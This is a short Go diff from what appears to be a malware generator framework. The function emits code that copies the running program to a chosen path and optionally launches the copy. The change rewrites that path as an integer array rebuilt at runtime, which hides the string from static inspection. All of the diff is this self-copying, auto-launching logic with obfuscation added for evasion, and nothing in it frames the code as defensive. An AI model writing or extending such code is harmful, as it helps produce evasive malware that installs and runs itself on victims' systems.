@@ -31,24 +31,24 @@ func path(value string, s_json string) ([]string, string) {
 	boot := tools.String_to_boolean(strings.ToLower(arr.Get(1)))
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(path string, auto_boot bool){", function_call),
-		"path = spine.variable.get(path)",
+		fmt.Sprintf("func %s(repr_1 []int, auto_boot bool){", function_call),
+		"path := spine.variable.get(spine.alpha.construct_string(repr_1))",
 		"src, err := os.Open(spine.path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 		"dst, err := os.Create(path)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 		"_, err = io.Copy(dst, src)",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 		"if auto_boot{",
 		"err = exec.Command(fmt.Sprintf(\"%s\", path)).Run()",
 		"if err != nil{",
-		"notify.Log(err.Error(), spine.logging, \"3\")",
+		"spine.log(err.Error())",
 		"}",
 		"}",
 		"}"})
@@ -58,5 +58,7 @@ func path(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
 
-	return []string{fmt.Sprintf("%s(\"%s\", %t)", function_call, path, boot)}, structure.Send(data_object)
+	parameter_1 := tools.Generate_int_array_parameter(path)
+
+	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, boot)}, structure.Send(data_object)
 }
